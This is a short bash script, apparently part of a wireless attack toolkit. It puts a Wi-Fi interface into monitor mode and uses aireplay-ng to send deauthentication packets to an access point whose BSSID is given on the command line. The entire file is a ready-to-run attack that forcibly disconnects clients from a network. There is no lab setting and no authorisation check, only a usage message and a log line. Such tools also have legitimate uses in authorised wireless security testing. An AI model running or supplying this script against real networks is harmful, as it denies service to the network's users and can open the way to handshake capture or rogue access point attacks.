#!/bin/bash
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/../utils/helpers.sh"
source "$SCRIPT_DIR/../utils/monitor_mode.sh"
source "$SCRIPT_DIR/../config/config.sh"

BSSID="$1"

if [[ -z "$BSSID" ]]; then
    error "Usage: deauth.sh <BSSID>"
fi

enable_monitor_mode

log "Sending deauth packets to AP: $BSSID"
sudo aireplay-ng --deauth 10 -a "$BSSID" "${INTERFACE}mon"
